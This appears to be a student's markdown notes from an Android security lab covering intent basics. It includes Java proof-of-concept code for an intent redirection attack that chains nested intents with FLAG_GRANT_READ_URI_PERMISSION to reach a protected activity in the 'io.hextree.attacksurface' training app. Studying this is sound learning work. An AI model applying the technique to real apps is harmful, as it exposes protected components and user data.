# Intents

- [Interaction with Intents](#interaction-with-intents)
- [Attacks](#attacks)
    - [Intent Redirection](#intent-redirection)


## Interaction with Intents
- **Commands to interact with intents**
    - `intent.setClassName(<Package_Name>,<Class_Name>);`
    - `startActivity(<Intent_Name>)`
    - `<Intent_Name>.setAction(<Action_Name>)`

- **Nested Intents**
```java
Intent intent3 = new Intent();
intent3.putExtra("reason","back");

Intent intent2 = new Intent();
intent2.putExtra("return",42);
intent2.putExtra("nextIntent",intent3);

Intent intent1 = new Intent();
intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
intent1.putExtra("android.intent.extra.INTENT",intent2);
startActivity(intent1);
```




## Attacks
### Intent Redirection
- If we can control the intent input of the startActivity() function, it may lead to an intent redirection vulnerability.
```java
// Redirect to flag6 Activity
Intent intent3 = new Intent();
intent3.putExtra("reason","next");
intent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
intent3.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity");

Intent intent2 = new Intent();
intent2.putExtra("return",42);
intent2.putExtra("nextIntent",intent3);

Intent intent1 = new Intent();
intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
intent1.putExtra("android.intent.extra.INTENT",intent2);
startActivity(intent1);
```

> [!NOTE]
> `FLAG_GRANT_READ_URI_PERMISSION`: If set, the recipient of this Intent will be granted permission to perform read operations on the URI in the Intent's data and any URIs specified in its ClipData.